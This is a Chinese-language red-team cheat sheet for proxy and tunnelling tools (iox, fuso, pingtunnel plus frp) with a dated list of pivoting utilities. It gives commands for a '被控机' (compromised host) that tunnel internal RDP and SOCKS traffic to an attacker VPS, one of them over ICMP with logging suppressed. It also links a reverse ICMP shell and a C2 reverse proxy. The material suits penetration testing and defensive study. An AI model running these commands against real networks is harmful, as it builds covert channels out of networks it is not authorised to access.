# proxy tools

## iox

下载地址：https://github.com/EddieIvan01/iox

### proxy

> 在本地 0.0.0.0:1080启动Socks5服务

```
./iox proxy -l 1080
```

> 加密转发 socks5 代理：

```
VPS 监听(//将1080端口监听到的流量转发至50054端口):
nohup ./iox proxy -l 50054 -l 1081 -k 3211 > iox.log &  

在目标主机执行(//启动代理服务并发送至VPS 50054端口)：
./iox proxy -r VPSIP:50054 -k 3211  

然后本地socks5代理：socks5://vps:1081
```

### fwd

> 本地端口转发 3389 至VPS:
```
vps执行:
nohup ./iox fwd -l *8888 -l 33890 -k 22222

目标机器执行:
iox.exe fwd -r 192.168.0.1:3389 -r *VPSIP:8888 -k 22222

随后连接 VPS:33890 即可访问内网 3389
```

## fuso

Github：https://github.com/editso/fuso

### socks

```
VPS：
./fus

//被控机
./fuc.exe VPSIP 6722 --socks
```

- linux：i686-unknown-linux-musl.zip
- windows：x86_64-pc-windows-msvc.zip

### readme

```
1. 端口转发
fuc --forward-host xxx.xxx.xxx.xxx --forward-port
   --forward-host: 转发到的地址
   --forward-port: 转发到的端口
   如: 转发流量到内网 10.10.10.4:3389
   > fuc --forward-host 10.10.10.4 --forward-port 3389

2. socks5:
fuc --socks --su --s5p xxx --s5u xxx
   --su: 可选的, 开启udp转发, 
   --s5p: 可选的, 认证密码, 默认不进行密码认证
   --s5u 可选的, 认证账号, 默认账号 anonymous
   --socks: 可选的, 开启socks5代理, 未指定--su的情况下不会转发udp
   如: 开启udp转发与密码认证
   > fuc --socks --su --s5p 123 --s5u socks
   此时, 已开启udp转发,连接密码为 "123",账号为 "socks"

3. 指定穿透成功时访问的端口
   fuc -b xxxx
   -b | --visit-bind-port: 可选的, 默认随机分配
   如: 访问外网端口 8888 转发到内网 80
   > fuc --forward-port 80 -b 8888
   
4. 桥接模式 注意: 目前不能转发udp
   fuc --bridge-listen xxxx --bridge-port xxx 
   --bridge-listen | --bl: 监听地址, 默认 127.0.0.1
   --bridge-port | --bp: 监听端口, 默认不启用桥接
   如: 开始桥接模式,并监听在9999端口, 本机ip地址为: 10.10.10.2
   > fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 开启桥接
   > fuc 10.10.10.2 9999 # 建立连接

   级联: 
   > fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 第一级, IP: 10.10.10.2
    > fuc --bridge-listen 0.0.0.0 --bridge-port 9991  10.10.10.2 9999 # 第二级, IP: 10.10.10.3
     > fuc 10.10.10.3 9991 # 最终 

5. 将连接信息通知到 Telegram 或其他
   fus --observer "program:[arguments]"
   --observer: 建立连接或断开连接时的钩子
   如: 使用bash脚本将连接信息通知到tg
   > fus --observer "/bin/bash:[telegram.sh]"

6. 指定客户端与服务端通信的端口
   fuc --channel-port 8888 ...
   --channel-port: 可选的, 客户端与服务端通信端口, 默认随机
```

## pingtunnel+frp 搭 icmp 隧道

pingtunnel 下载：https://oss.ywhack.com/%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/pingtunnel-2.6

### 被控机

```bash
nohup ./pingtunnel -type client -l 127.0.0.1:9999 -s vpsip -t vpsip:10000 -sock5 -1 -noprint 1 -nolog 1 >p.log &
nohup ./frpc -c frpc.ini > fff.log &
```

pingtunnel -l 监听本地的9999端口 -s vps主机IP  -t vps主机frp服务端口

客户端frp配置：

```ini
[common]
server_addr = 127.0.0.1
server_port = 10000
token = PassW0Rd

[zhaoshangju_10078]
type = tcp
remote_port = 10015
plugin = socks5
plugin_user = thIsuserAS
plugin_passwd = Passweqwe0Rm
use_encryption = true
```

### VPS

```bash
./pingtunnel -type server
./frps -c frps.ini
```

本地代理vps的 10015 端口加上密码即可使用icmp隧道。

参考文章：https://www.cnblogs.com/cute-puli/p/15213394.html


## FRP

* 将 frps 及 frps.ini 放到具有公网 IP 的机器上。
* 将 frpc 及 frpc.ini 放到处于内网环境的机器上。

- 客户端：frpc -c frpc.ini
- 服务端：frps -c frps.ini

Github:https://github.com/fatedier/frp

## 代理工具列表

*   \[2021.03.07\] - [proxifier 全平台代理工具，支持多种socks协议](https://www.proxifier.com/)
*   \[2021.03.07\] - [frp 专注于内网穿透的高性能的反向代理应用](https://github.com/fatedier/frp)
*   \[2021.03.07\] - [nps 轻量级、高性能、功能强大的内网穿透代理服务器](https://github.com/ehang-io/nps)
*   \[2021.03.07\] - [iox 端口转发 & 内网代理工具](https://github.com/EddieIvan01/iox)
*   \[2021.03.07\] - [Stowaway 面向渗透测试人员的多级代理工具](https://github.com/ph4ntonn/Stowaway)
*   \[2021.03.07\] - [rathole Rust 编写的安全、稳定、高性能的内网穿透工具](https://github.com/rapiz1/rathole)
*   \[2021.03.07\] - [rsocx 一款高性能的支持绑定/反向代理的 Socks5 工具](https://github.com/b23r0/rsocx)
*   \[2021.03.07\] - [rakshasa 基于go编写的跨平台、稳定、隐秘的多级代理内网穿透工具](https://github.com/Mob2003/rakshasa)
*   \[2021.03.07\] - [SwitchyOmega 浏览器的代理插件](https://github.com/FelisCatus/SwitchyOmega)
*   \[2021.03.07\] - [Neo-reGeorg 改进的reGeorg版本](https://github.com/L-codes/Neo-reGeorg)
*   \[2021.03.07\] - [dns2tcp是一款利用dns协议传输tcp数据的工具](https://github.com/alex-sector/dns2tcp)
*   \[2021.03.07\] - [dnscat2 是一个DNS隧道工具](https://github.com/iagox86/dnscat2)
*   \[2021.03.07\] - [ABPTTS 基于ssl加密的http隧道工具](https://github.com/nccgroup/ABPTTS)
*   \[2021.03.07\] - [Termite 内网渗透代理、端口转发工具](http://rootkiter.com/Termite/)
*   \[2021.03.07\] - [SSTap, 一款利用虚拟网卡在网络层实现的代理工具](https://github.com/FQrabbit/SSTap-Rule)
*   \[2021.03.07\] - [ew 用于开启 SOCKS v5 代理服务的工具(跨平台)](https://github.com/idlefire/ew)
*   \[2021.03.07\] - [n2n 开源的点对点穿透工具](https://github.com/ntop/n2n)
*   \[2021.03.07\] - [Ecloud 一款基于http/1.1协议传输TCP流量的工具](https://github.com/CTF-MissFeng/Ecloud)
*   \[2021.03.07\] - [icmpsh 一个简单的 reverse ICMP shell](https://github.com/inquisb/icmpsh)
*   \[2021.03.08\] - [ngrok 正/反向代理，内网穿透，端口转发](https://github.com/inconshreveable/ngrok)
*   \[2021.03.08\] - [ssf 全平台的加密隧道 端口转发工具](https://securesocketfunneling.github.io/ssf/)
*   \[2021.03.14\] - [proxychains 命令行代理神器](https://github.com/haad/proxychains)
*   \[2021.03.14\] - [switcher 一个多功能的端口转发/端口复用工具](https://github.com/crabkun/switcher)
*   \[2021.03.22\] - [pingtunnel 是把 tcp/udp/sock5 流量伪装成 icmp 流量进行转发的工具](https://github.com/esrrhs/pingtunnel)
*   \[2021.03.26\] - [chisel - 一款快速稳定的隧道工具](https://github.com/jpillora/chisel)
*   \[2021.03.29\] - [pystinger - 一款使用webshell进行流量转发的出网工具](https://github.com/FunnyWolf/pystinger)
*   \[2021.03.29\] - [pivotnacci - 通过HTTP代理建立socks连接的工具](https://github.com/blackarrowsec/pivotnacci)
*   \[2021.04.06\] - [lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具](https://github.com/ffay/lanproxy)
*   \[2021.04.14\] - [Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具](https://github.com/Dliv3/Venom)
*   \[2021.05.07\] - [goproxy 一款轻量级、功能强大、高性能的多种代理工具](https://github.com/snail007/goproxy)
*   \[2021.05.07\] - [SCFProxy 一个基于腾讯云函数服务的免费代理池](https://github.com/shimmeris/SCFProxy)
*   \[2021.06.21\] - [MOSN 是边缘或服务网格的云原生代理。](https://github.com/mosn/mosn)
*   \[2021.06.23\] - [C2ReverseProxy 一款可以在不出网的环境下进行反向代理及cs上线的工具](https://github.com/Daybr4ak/C2ReverseProxy)